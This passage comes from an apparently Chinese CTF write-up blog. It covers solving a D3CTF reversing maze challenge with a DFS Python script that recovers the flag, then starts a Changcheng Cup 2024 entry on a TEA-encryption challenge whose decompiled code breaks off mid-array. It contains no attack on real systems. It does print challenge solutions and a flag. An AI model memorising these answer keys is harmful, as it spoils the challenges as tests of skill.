class="hljs-number">7</span>), (<span class="hljs-number">38</span>, <span class="hljs-number">38</span>), (<span class="hljs-number">39</span>, <span class="hljs-number">39</span>), (<span class="hljs-number">48</span>, <span class="hljs-number">171</span>), (-<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>), (<span class="hljs-number">236</span>, <span class="hljs-number">251</span>), (<span class="hljs-number">16</span>, <span class="hljs-number">192</span>), (-<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>), (<span class="hljs-number">125</span>, <span class="hljs-number">165</span>), (<span class="hljs-number">46</span>, <span class="hljs-number">46</span>), (<span class="hljs-number">260</span>, <span class="hljs-number">27</span>), (<span class="hljs-number">45</span>, <span class="hljs-number">3</span>), (<span class="hljs-number">174</span>, <span class="hljs-number">190</span>), (<span class="hljs-number">219</span>, <span class="hljs-number">92</span>), (<span class="hljs-number">51</span>, <span class="hljs-number">51</span>), (-<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>), <span class="hljs-string">&#x27;add     [ebp+28D5560Ah], ecx&#x27;</span>, (<span class="hljs-number">54</span>, <span class="hljs-number">54</span>), (<span class="hljs-number">280</span>, <span class="hljs-number">204</span>), (<span class="hljs-number">20</span>, <span class="hljs-number">135</span>), (<span class="hljs-number">57</span>, <span class="hljs-number">57</span>), (<span class="hljs-number">58</span>, <span class="hljs-number">58</span>), (<span class="hljs-number">59</span>, <span class="hljs-number">59</span>), (<span class="hljs-number">60</span>, <span class="hljs-number">60</span>), (<span class="hljs-number">223</span>, <span class="hljs-number">235</span>), (<span class="hljs-number">113</span>, <span class="hljs-number">265</span>), (<span class="hljs-number">55</span>, <span class="hljs-number">278</span>), (<span class="hljs-number">87</span>, <span class="hljs-number">6</span>), (<span class="hljs-number">19</span>, <span class="hljs-number">214</span>), (<span class="hljs-number">100</span>, <span class="hljs-number">36</span>), (-<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>), (<span class="hljs-number">68</span>, <span class="hljs-number">68</span>), (<span class="hljs-number">69</span>, <span class="hljs-number">69</span>), (<span class="hljs-number">70</span>, <span class="hljs-number">70</span>), (<span class="hljs-number">130</span>, <span class="hljs-number">24</span>), (<span class="hljs-number">258</span>, <span class="hljs-number">44</span>), (<span class="hljs-number">73</span>, <span class="hljs-number">73</span>), (<span class="hljs-number">74</span>, <span class="hljs-number">74</span>), (<span class="hljs-number">75</span>, <span class="hljs-number">75</span>), (<span class="hljs-number">76</span>, <span class="hljs-number">76</span>), (<span class="hljs-number">77</span>, <span class="hljs-number">77</span>), (<span class="hljs-number">122</span>, <span class="hljs-number">240</span>), (<span class="hljs-number">79</span>, <span class="hljs-number">79</span>), (<span class="hljs-number">80</span>, <span class="hljs-number">80</span>), (-<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>), (<span class="hljs-number">67</span>, <span class="hljs-number">26</span>), (<span class="hljs-number">83</span>, <span class="hljs-number">83</span>), (<span class="hljs-number">117</span>, <span class="hljs-number">118</span>), (<span class="hljs-number">85</span>, <span class="hljs-number">85</span>), (-<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>), (-<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>), (<span class="hljs-number">106</span>, <span class="hljs-number">73</span>), (<span class="hljs-number">89</span>, <span class="hljs-number">89</span>), (-<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>), (-<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>), (<span class="hljs-number">119</span>, <span class="hljs-number">129</span>), (<span class="hljs-number">93</span>, <span class="hljs-number">93</span>), (<span class="hljs-number">85</span>, <span class="hljs-number">167</span>), (-<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>), (<span class="hljs-number">96</span>, <span class="hljs-number">96</span>), (<span class="hljs-number">97</span>, <span class="hljs-number">97</span>), (<span class="hljs-number">123</span>, <span class="hljs-number">225</span>), (<span class="hljs-number">259</span>, <span class="hljs-number">173</span>), (<span class="hljs-number">229</span>, <span class="hljs-number">226</span>), (<span class="hljs-number">101</span>, <span class="hljs-number">101</span>), (<span class="hljs-number">269</span>, <span class="hljs-number">68</span>), (<span class="hljs-number">169</span>, <span class="hljs-number">182</span>), (<span class="hljs-number">104</span>, <span class="hljs-number">104</span>), (<span class="hljs-number">105</span>, <span class="hljs-number">105</span>), (<span class="hljs-number">154</span>, <span class="hljs-number">50</span>), (-<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>), (<span class="hljs-number">108</span>, <span class="hljs-number">108</span>), (<span class="hljs-number">23</span>, <span class="hljs-number">112</span>), (<span class="hljs-number">140</span>, <span class="hljs-number">99</span>), (<span class="hljs-number">111</span>, <span class="hljs-number">111</span>), (<span class="hljs-number">210</span>, <span class="hljs-number">202</span>), (<span class="hljs-number">113</span>, <span class="hljs-number">113</span>), (<span class="hljs-number">274</span>, <span class="hljs-number">56</span>), (-<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>), (-<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>), (<span class="hljs-number">261</span>, <span class="hljs-number">42</span>), (<span class="hljs-number">118</span>, <span class="hljs-number">118</span>), (<span class="hljs-number">32</span>, <span class="hljs-number">115</span>), (<span class="hljs-number">267</span>, <span class="hljs-number">209</span>), (<span class="hljs-number">121</span>, <span class="hljs-number">121</span>), (<span class="hljs-number">122</span>, <span class="hljs-number">122</span>), (<span class="hljs-number">123</span>, <span class="hljs-number">123</span>), (<span class="hljs-number">231</span>, <span class="hljs-number">256</span>), (<span class="hljs-number">125</span>, <span class="hljs-number">125</span>), (<span class="hljs-number">126</span>, <span class="hljs-number">126</span>), (<span class="hljs-number">57</span>, <span class="hljs-number">206</span>), (<span class="hljs-number">145</span>, <span class="hljs-number">245</span>), (<span class="hljs-number">129</span>, <span class="hljs-number">129</span>), (<span class="hljs-number">130</span>, <span class="hljs-number">130</span>), (<span class="hljs-number">131</span>, <span class="hljs-number">131</span>), (-<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>), (<span class="hljs-number">133</span>, <span class="hljs-number">133</span>), (<span class="hljs-number">155</span>, <span class="hljs-number">162</span>), (<span class="hljs-number">135</span>, <span class="hljs-number">135</span>), (<span class="hljs-number">136</span>, <span class="hljs-number">136</span>), (-<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>), (-<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>), (-<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>), (<span class="hljs-number">140</span>, <span class="hljs-number">140</span>), (<span class="hljs-number">78</span>, <span class="hljs-number">197</span>), (<span class="hljs-number">134</span>, <span class="hljs-number">163</span>), (<span class="hljs-number">200</span>, <span class="hljs-number">103</span>), (<span class="hljs-number">71</span>, <span class="hljs-number">218</span>), (<span class="hljs-number">185</span>, <span class="hljs-number">283</span>), (-<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>), (<span class="hljs-number">139</span>, <span class="hljs-number">34</span>), (<span class="hljs-number">188</span>, <span class="hljs-number">104</span>), (-<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>), (<span class="hljs-number">150</span>, <span class="hljs-number">150</span>), (<span class="hljs-number">151</span>, <span class="hljs-number">151</span>), (<span class="hljs-number">102</span>, <span class="hljs-number">253</span>), (<span class="hljs-number">246</span>, <span class="hljs-number">157</span>), (<span class="hljs-number">154</span>, <span class="hljs-number">154</span>), (<span class="hljs-number">155</span>, <span class="hljs-number">155</span>), <span class="hljs-string">&#x27;add     [ebp+57h], ebp&#x27;</span>, (<span class="hljs-number">93</span>, <span class="hljs-number">255</span>), (<span class="hljs-number">158</span>, <span class="hljs-number">158</span>), (<span class="hljs-number">38</span>, <span class="hljs-number">144</span>), (<span class="hljs-number">281</span>, <span class="hljs-number">286</span>), (<span class="hljs-number">28</span>, <span class="hljs-number">146</span>), (<span class="hljs-number">186</span>, <span class="hljs-number">285</span>), (<span class="hljs-number">163</span>, <span class="hljs-number">163</span>), (<span class="hljs-number">138</span>, <span class="hljs-number">174</span>), (<span class="hljs-number">69</span>, <span class="hljs-number">37</span>), (<span class="hljs-number">166</span>, <span class="hljs-number">166</span>), (<span class="hljs-number">241</span>, <span class="hljs-number">111</span>), (<span class="hljs-number">168</span>, <span class="hljs-number">168</span>), (<span class="hljs-number">169</span>, <span class="hljs-number">169</span>), (-<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>), (<span class="hljs-number">171</span>, <span class="hljs-number">171</span>), (<span class="hljs-number">58</span>, <span class="hljs-number">148</span>), (<span class="hljs-number">173</span>, <span class="hljs-number">173</span>), (<span class="hljs-number">205</span>, <span class="hljs-number">64</span>), (<span class="hljs-number">175</span>, <span class="hljs-number">175</span>), (<span class="hljs-number">176</span>, <span class="hljs-number">176</span>), (<span class="hljs-number">177</span>, <span class="hljs-number">177</span>), <span class="hljs-string">&#x27;add     ds:0F215EE7Ch[edi*8], ecx&#x27;</span>, (<span class="hljs-number">181</span>, <span class="hljs-number">75</span>), (<span class="hljs-number">128</span>, <span class="hljs-number">264</span>), (<span class="hljs-number">257</span>, <span class="hljs-number">270</span>), (<span class="hljs-number">160</span>, <span class="hljs-number">176</span>), (<span class="hljs-number">221</span>, <span class="hljs-number">175</span>), (<span class="hljs-number">101</span>, <span class="hljs-number">141</span>), (<span class="hljs-number">220</span>, <span class="hljs-number">47</span>), (<span class="hljs-number">88</span>, <span class="hljs-number">91</span>), (<span class="hljs-number">195</span>, <span class="hljs-number">114</span>), (<span class="hljs-number">158</span>, <span class="hljs-number">247</span>), (<span class="hljs-number">189</span>, <span class="hljs-number">189</span>), (<span class="hljs-number">80</span>, <span class="hljs-number">142</span>), (<span class="hljs-number">287</span>, <span class="hljs-number">133</span>), (-<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>), (<span class="hljs-number">14</span>, <span class="hljs-number">161</span>), (<span class="hljs-number">242</span>, <span class="hljs-number">166</span>), (<span class="hljs-number">195</span>, <span class="hljs-number">195</span>), (<span class="hljs-number">196</span>, <span class="hljs-number">196</span>), (<span class="hljs-number">197</span>, <span class="hljs-number">197</span>), <span class="hljs-string">&#x27;add     [edx], edi&#x27;</span>, (<span class="hljs-number">131</span>, <span class="hljs-number">65</span>), (<span class="hljs-number">200</span>, <span class="hljs-number">200</span>), (<span class="hljs-number">190</span>, <span class="hljs-number">130</span>), (<span class="hljs-number">199</span>, <span class="hljs-number">96</span>), (<span class="hljs-number">183</span>, <span class="hljs-number">105</span>), (<span class="hljs-number">204</span>, <span class="hljs-number">204</span>), (-<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>), (<span class="hljs-number">35</span>, <span class="hljs-number">74</span>), (-<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>), (<span class="hljs-number">168</span>, <span class="hljs-number">109</span>), (<span class="hljs-number">209</span>, <span class="hljs-number">209</span>), (<span class="hljs-number">210</span>, <span class="hljs-number">210</span>), (-<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>), (-<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>), (<span class="hljs-number">213</span>, <span class="hljs-number">213</span>), (<span class="hljs-number">239</span>, <span class="hljs-number">108</span>), (<span class="hljs-number">215</span>, <span class="hljs-number">215</span>), (-<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>), (<span class="hljs-number">217</span>, <span class="hljs-number">217</span>), (<span class="hljs-number">218</span>, <span class="hljs-number">218</span>), (<span class="hljs-number">219</span>, <span class="hljs-number">219</span>), (<span class="hljs-number">220</span>, <span class="hljs-number">220</span>), (<span class="hljs-number">136</span>, <span class="hljs-number">10</span>), (<span class="hljs-number">222</span>, <span class="hljs-number">222</span>), (<span class="hljs-number">107</span>, <span class="hljs-number">266</span>), (<span class="hljs-number">66</span>, <span class="hljs-number">273</span>), (<span class="hljs-number">1</span>, <span class="hljs-number">21</span>), (-<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>), (<span class="hljs-number">227</span>, <span class="hljs-number">227</span>), (<span class="hljs-number">228</span>, <span class="hljs-number">228</span>), (<span class="hljs-number">263</span>, <span class="hljs-number">170</span>), (<span class="hljs-number">5</span>, <span class="hljs-number">191</span>), (<span class="hljs-number">62</span>, <span class="hljs-number">46</span>), (<span class="hljs-number">232</span>, <span class="hljs-number">232</span>), (-<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>), (<span class="hljs-number">103</span>, <span class="hljs-number">36</span>), (-<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>), (<span class="hljs-number">236</span>, <span class="hljs-number">236</span>), (<span class="hljs-number">184</span>, <span class="hljs-number">2</span>), (-<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>), (<span class="hljs-number">98</span>, <span class="hljs-number">137</span>), (<span class="hljs-number">126</span>, <span class="hljs-number">277</span>), (<span class="hljs-number">217</span>, <span class="hljs-number">250</span>), (<span class="hljs-number">172</span>, <span class="hljs-number">228</span>), (<span class="hljs-number">102</span>, <span class="hljs-number">70</span>), (-<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>), (<span class="hljs-number">245</span>, <span class="hljs-number">245</span>), (<span class="hljs-number">246</span>, <span class="hljs-number">246</span>), (<span class="hljs-number">17</span>, <span class="hljs-number">86</span>), (<span class="hljs-number">248</span>, <span class="hljs-number">248</span>), (<span class="hljs-number">104</span>, <span class="hljs-number">38</span>), (<span class="hljs-number">83</span>, <span class="hljs-number">268</span>), (<span class="hljs-number">39</span>, <span class="hljs-number">187</span>), (<span class="hljs-number">270</span>, <span class="hljs-number">128</span>), (<span class="hljs-number">253</span>, <span class="hljs-number">253</span>), (<span class="hljs-number">22</span>, <span class="hljs-number">149</span>), (<span class="hljs-number">4</span>, <span class="hljs-number">94</span>), (<span class="hljs-number">256</span>, <span class="hljs-number">256</span>), (<span class="hljs-number">257</span>, <span class="hljs-number">257</span>), (<span class="hljs-number">222</span>, <span class="hljs-number">84</span>), (<span class="hljs-number">215</span>, <span class="hljs-number">288</span>), (<span class="hljs-number">260</span>, <span class="hljs-number">260</span>), (-<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>), (<span class="hljs-number">254</span>, <span class="hljs-number">248</span>), (<span class="hljs-number">164</span>, <span class="hljs-number">132</span>), (<span class="hljs-number">264</span>, <span class="hljs-number">264</span>), (<span class="hljs-number">54</span>, <span class="hljs-number">262</span>), (<span class="hljs-number">33</span>, <span class="hljs-number">9</span>), (<span class="hljs-number">253</span>, <span class="hljs-number">18</span>), (<span class="hljs-number">213</span>, <span class="hljs-number">203</span>), (<span class="hljs-number">30</span>, <span class="hljs-number">97</span>), (<span class="hljs-number">40</span>, <span class="hljs-number">227</span>), (<span class="hljs-number">271</span>, <span class="hljs-number">271</span>), (<span class="hljs-number">79</span>, <span class="hljs-number">127</span>), (-<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>), (<span class="hljs-number">274</span>, <span class="hljs-number">274</span>), (<span class="hljs-number">131</span>, <span class="hljs-number">241</span>), (<span class="hljs-number">212</span>, <span class="hljs-number">63</span>), (<span class="hljs-number">77</span>, <span class="hljs-number">143</span>), (-<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>), (<span class="hljs-number">121</span>, <span class="hljs-number">110</span>), (<span class="hljs-number">124</span>, <span class="hljs-number">150</span>), (<span class="hljs-number">281</span>, <span class="hljs-number">281</span>), (<span class="hljs-number">282</span>, <span class="hljs-number">282</span>), (-<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>), <span class="hljs-string">&#x27;add     edi, esp&#x27;</span>, (<span class="hljs-number">285</span>, <span class="hljs-number">285</span>), (<span class="hljs-number">51</span>, <span class="hljs-number">29</span>), (<span class="hljs-number">282</span>, <span class="hljs-number">208</span>), (<span class="hljs-number">159</span>, <span class="hljs-number">177</span>)]<br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x121</span>):<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">type</span>(op_ls[i]) != <span class="hljs-built_in">str</span>):<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x121</span>):<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">type</span>(op_ls[j]) == <span class="hljs-built_in">str</span>):<br>            <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">if</span> (i <span class="hljs-keyword">in</span> op_ls[j]):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[<span class="hljs-subst">&#123;i&#125;</span>]: <span class="hljs-subst">&#123;op_ls[i]&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">break</span><br><br></code></pre></td></tr></table></figure><p>真出口在<code>[27] mov eax, 1; mov dword ptr [eax], 39393939h</code></p><p>dfs走迷宫找出口记录路径</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">dfs</span>(<span class="hljs-params">cur, path=[]</span>):<br>    <span class="hljs-comment"># print(cur, path)</span><br>    <span class="hljs-keyword">if</span> (cur == <span class="hljs-number">27</span>):<br>        <span class="hljs-built_in">print</span>(path)<br>        <span class="hljs-keyword">return</span><br>    <span class="hljs-keyword">elif</span> (<span class="hljs-built_in">type</span>(op_ls[cur]) == <span class="hljs-built_in">str</span>):<br>        <span class="hljs-keyword">return</span><br>    l = op_ls[cur][<span class="hljs-number">0</span>]<br>    <span class="hljs-keyword">if</span> (l != -<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> l <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> path):<br>        new_path = path.copy()<br>        new_path.append(cur)<br>        dfs(l, new_path)<br>    r = op_ls[cur][<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">if</span> (r != -<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> r <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> path):<br>        new_path = path.copy()<br>        new_path.append(cur)<br>        dfs(r, new_path)<br><br>dfs(<span class="hljs-number">0</span>, [])<br></code></pre></td></tr></table></figure><p>只有一条路，长度正好是<code>17 * 8</code>，把路径转换为flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">path = [<span class="hljs-number">11</span>, <span class="hljs-number">82</span>, <span class="hljs-number">26</span>, <span class="hljs-number">224</span>, <span class="hljs-number">66</span>, <span class="hljs-number">100</span>, <span class="hljs-number">229</span>, <span class="hljs-number">263</span>, <span class="hljs-number">164</span>, <span class="hljs-number">174</span>, <span class="hljs-number">64</span>, <span class="hljs-number">6</span>, <span class="hljs-number">193</span>, <span class="hljs-number">161</span>, <span class="hljs-number">28</span>, <span class="hljs-number">61</span>, <span class="hljs-number">223</span>, <span class="hljs-number">266</span>, <span class="hljs-number">9</span>, <span class="hljs-number">13</span>, <span class="hljs-number">8</span>, <span class="hljs-number">43</span>, <span class="hljs-number">16</span>, <span class="hljs-number">72</span>, <span class="hljs-number">258</span>, <span class="hljs-number">84</span>, <span class="hljs-number">117</span>, <span class="hljs-number">42</span>, <span class="hljs-number">251</span>, <span class="hljs-number">187</span>, <span class="hljs-number">114</span>, <span class="hljs-number">56</span>, <span class="hljs-number">20</span>, <span class="hljs-number">230</span>, <span class="hljs-number">191</span>, <span class="hljs-number">287</span>, <span class="hljs-number">208</span>, <span class="hljs-number">109</span>, <span class="hljs-number">112</span>, <span class="hljs-number">202</span>, <span class="hljs-number">199</span>, <span class="hljs-number">65</span>, <span class="hljs-number">214</span>, <span class="hljs-number">239</span>, <span class="hljs-number">98</span>, <span class="hljs-number">225</span>, <span class="hljs-number">21</span>, <span class="hljs-number">237</span>, <span class="hljs-number">184</span>, <span class="hljs-number">141</span>, <span class="hljs-number">78</span>, <span class="hljs-number">240</span>, <span class="hljs-number">277</span>, <span class="hljs-number">143</span>, <span class="hljs-number">103</span>, <span class="hljs-number">182</span>, <span class="hljs-number">160</span>, <span class="hljs-number">286</span>, <span class="hljs-number">29</span>, <span class="hljs-number">179</span>, <span class="hljs-number">181</span>, <span class="hljs-number">270</span>, <span class="hljs-number">40</span>, <span class="hljs-number">48</span>, <span class="hljs-number">45</span>, <span class="hljs-number">165</span>, <span class="hljs-number">37</span>, <span class="hljs-number">276</span>, <span class="hljs-number">63</span>, <span class="hljs-number">55</span>, <span class="hljs-number">280</span>, <span class="hljs-number">124</span>, <span class="hljs-number">231</span>, <span class="hljs-number">62</span>, <span class="hljs-number">265</span>, <span class="hljs-number">262</span>, <span class="hljs-number">254</span>, <span class="hljs-number">22</span>, <span class="hljs-number">190</span>, <span class="hljs-number">142</span>, <span class="hljs-number">134</span>, <span class="hljs-number">162</span>, <span class="hljs-number">186</span>, <span class="hljs-number">88</span>, <span class="hljs-number">106</span>, <span class="hljs-number">50</span>, <span class="hljs-number">92</span>, <span class="hljs-number">119</span>, <span class="hljs-number">32</span>, <span class="hljs-number">147</span>, <span class="hljs-number">34</span>, <span class="hljs-number">153</span>, <span class="hljs-number">157</span>, <span class="hljs-number">255</span>, <span class="hljs-number">94</span>, <span class="hljs-number">167</span>, <span class="hljs-number">241</span>, <span class="hljs-number">250</span>, <span class="hljs-number">268</span>, <span class="hljs-number">203</span>, <span class="hljs-number">183</span>, <span class="hljs-number">221</span>, <span class="hljs-number">10</span>, <span class="hljs-number">120</span>, <span class="hljs-number">267</span>, <span class="hljs-number">18</span>, <span class="hljs-number">194</span>, <span class="hljs-number">242</span>, <span class="hljs-number">172</span>, <span class="hljs-number">148</span>, <span class="hljs-number">188</span>, <span class="hljs-number">247</span>, <span class="hljs-number">17</span>, <span class="hljs-number">272</span>, <span class="hljs-number">127</span>, <span class="hljs-number">206</span>, <span class="hljs-number">35</span>, <span class="hljs-number">279</span>, <span class="hljs-number">110</span>, <span class="hljs-number">99</span>, <span class="hljs-number">259</span>, <span class="hljs-number">288</span>, <span class="hljs-number">159</span>, <span class="hljs-number">144</span>, <span class="hljs-number">71</span>, <span class="hljs-number">24</span>, <span class="hljs-number">243</span>, <span class="hljs-number">102</span>, <span class="hljs-number">269</span>, <span class="hljs-number">30</span>, <span class="hljs-number">180</span>, <span class="hljs-number">128</span>, <span class="hljs-number">145</span>, <span class="hljs-number">185</span>, <span class="hljs-number">47</span>, <span class="hljs-number">27</span>]<br><br>last = <span class="hljs-number">0</span><br>flag = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> cur <span class="hljs-keyword">in</span> path:<br>    <span class="hljs-keyword">if</span> (cur == op_ls[last][<span class="hljs-number">0</span>]):<br>        flag += <span class="hljs-string">&quot;0&quot;</span><br>    <span class="hljs-keyword">else</span>:<br>        flag += <span class="hljs-string">&quot;1&quot;</span><br>    last = cur<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">int</span>(flag, <span class="hljs-number">2</span>).to_bytes(<span class="hljs-number">17</span>))<br><span class="hljs-comment"># d3ctf&#123;0ut_of_th3ForesT#&#125;</span><br></code></pre></td></tr></table></figure><p>最后得到题目flag<code>d3ctf&#123;0ut_of_th3ForesT#&#125;</code></p>]]></content>
    
    
    <categories>
      
      <category>ctf-wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>RE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2024长城杯初赛逆向</title>
    <link href="/2024/03/30/ctf_wp/%E9%95%BF%E5%9F%8E%E6%9D%AF2024%E5%88%9D%E8%B5%9B%E9%80%86%E5%90%91/"/>
    <url>/2024/03/30/ctf_wp/%E9%95%BF%E5%9F%8E%E6%9D%AF2024%E5%88%9D%E8%B5%9B%E9%80%86%E5%90%91/</url>
    
    <content type="html"><![CDATA[<h2 id="比赛吐槽"><a href="#比赛吐槽" class="headerlink" title="比赛吐槽"></a>比赛吐槽</h2><p>线上比赛还得队员在一起开摄像头，逆天比赛</p><p>题目不给分类</p><p>3h 20t？开玩笑吧</p><p>逆向部分题目质量不错</p><h2 id="Tea"><a href="#Tea" class="headerlink" title="Tea"></a>Tea</h2><p>简单的tea，输入flag每8字节加密一次，一共加密5次，密钥固定</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __fastcall <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">char</span> Str[<span class="hljs-number">64</span>]; <span class="hljs-comment">// [rsp+20h] [rbp-70h] BYREF</span><br>  <span class="hljs-type">char</span> v5[<span class="hljs-number">39</span>]; <span class="hljs-comment">// [rsp+60h] [rbp-30h]</span><br>  <span class="hljs-type">char</span> v6[<span class="hljs-number">3</span>]; <span class="hljs-comment">// [rsp+87h] [rbp-9h] BYREF</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+8Ch] [rbp-4h]</span><br><br>  _main();<br>  v5[<span class="hljs-number">0</span>] = <span class="hljs-number">-119</span>;<br>  v5[<span class="hljs-number">1</span>] = <span class="hljs-number">-48</span>;<br>  v5[<span class="hljs-number">2</span>] = <span class="hljs-number">-121</span>;<br>  v5[<span class="hljs-number">3</span>] = <span class="hljs-number">54</span>;<br>  v5[<span class="hljs-number">4</span>] = <span class="hljs-number">-55</span>;<br>  v5[<span class="hljs-number">5</span>] = <span class="hljs-number">69</span>;<br>  v5[<span class="hljs-number">6</span>] = <span class="hljs-number">-39</span>;<br>  v5[<span class="hljs-number">7</span>] = <span class="hljs-number">-48</span>;<br>  v5[<span class="hljs-number">8</span>] = <span class="hljs-number">113</span>;<br>  v5[<span class="hljs-number">9</span>] = <span class="hljs-number">59</span>;<br>  v5[<span class="hljs-number">10</span>] = <span class="hljs-number">54</span>;<br>  v5[<span class="hljs-number">11</span>] = <span class="hljs-number">-109</span>;<br>  v5[<span class="hljs-number">12</span>] = <span class="hljs-number">24</span>;<br>  v5[<span class="hljs-number">13</span>] = <span class="hljs-number">-65</span>;<br>  v5[<span class="hljs-number">14</span>] = <span class="hljs-number">1</span>;<br>  v5[<span class="hljs-number">15</span>] = <span class="hljs-number">99</span>;<br>  v5[<span class="hljs-number">16</span>] = <span class="hljs-number">-87</span>;<br>  v5[<span class="hljs-number">17</span>] = <span class="hljs-number">54</span>;<br>  v5[<span class="hljs-number">18</span>] = <span class="hljs-number">126</span>;<br>  v5[<span class="hljs-number">19</span>] = <span class="hljs-number">-9</span>;<br>  v5[<span class="hljs-number">20</span>] = <span class="hljs-number">-1</span>;<br>  v5[<span class="hljs-number">21</span>] = <span class="hljs-number">32</span>;<br>  v5[<span class="hljs-number">22</span>] = <span class="hljs-number">25</span>;<br>  v5[<span class="hljs-number">23</span>] = <span class="hljs-number">-126</span>;<br>  v5[<span class="hljs-number">24</span>] = <span class="hljs-number">-51</span>;<br>  v5[<span class="hljs-number">25</span>] = <span class="hljs-number">119</span>;<br>  v5[<span class="hljs-number">26</span>] = <span class="hljs-number">123</span>;<br>  v5[<span class="hljs-number">27</span>] = <span class="hljs-number">-118</span>;<br>  v5[<span class="hljs-number">28</span>] = <span class="hljs-number">18</span>;<br>  v5[<span class="hljs-number">29</span>] = <span class="hljs-number">48</span>;<br>  v5[<span class="hljs-number">30</span>] = <span class="hljs-number">34</span>;<br>  v5[<span class="hljs-number">31</span>] = <span class="hljs-number">80</span>;<br>  v5[<span class="hljs-number">32</span>] = <span class="hljs-number">-106</span>;<br>  v5[<span class="hljs-number">33</span>] = <span class="hljs-number">-87</span>;<br>  v5[<span 